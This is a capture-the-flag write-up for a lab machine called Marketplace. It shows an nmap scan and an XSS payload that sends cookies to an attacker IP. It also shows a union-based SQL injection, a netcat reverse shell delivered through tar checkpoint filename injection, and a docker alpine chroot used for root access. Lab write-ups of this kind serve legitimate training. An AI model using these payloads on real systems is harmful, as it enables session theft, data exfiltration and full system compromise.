# Marketplace
# Mayank Srivastava | 15 dec 2020
--------------------------------------------------

## Nmap Scan

``` #Nmap 7.91 scan initiated Tue Dec 15 16:06:17 2020 as: nmap -sC -sV -oN nmap/initial 10.10.44.16
 Nmap scan report for 10.10.44.16
Host is up (0.62s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 15 16:07:40 2020 -- 1 IP address (1 host up) scanned in 82.97 seconds
```

Found xss vulnerability in both of text box

## running python3 simple http server

``` <script>var i=new Image; i.src="http://10.4.10.4:8000/?"+document.cookie;</script>```

admin token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDgwMjk3ODN9.vJ9-d2NiJld0S3a5Am7DNkxYuD-ubW_QWg0v1lX5t6g


## Sql Injection

looks like admin panel have sql vulnerability for cross check put" ' " at the end of the url

now we can inject some sql code to access the database also we can try union based sqli attack to read content from the database

/admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -

## privilege escalation

after found the username and the ssh password

we are on the box

sudo -l 

User jake may run the following commands on the-marketplace:
   (michael) NOPASSWD: /opt/backups/backup.sh
```
we can exploit tar to gain access on the machine

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.10.4 9001 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

chmod 777 /opt/backups/backup.tar

nc -nlvp 9001

get connection as michael but user michael is in docker env
we can also exploit docker env using alpine

docker image ls

docker run -v / :/mnt --rm -it alpine chroot /mnt sh

after running this docker alpine we have a root shell 
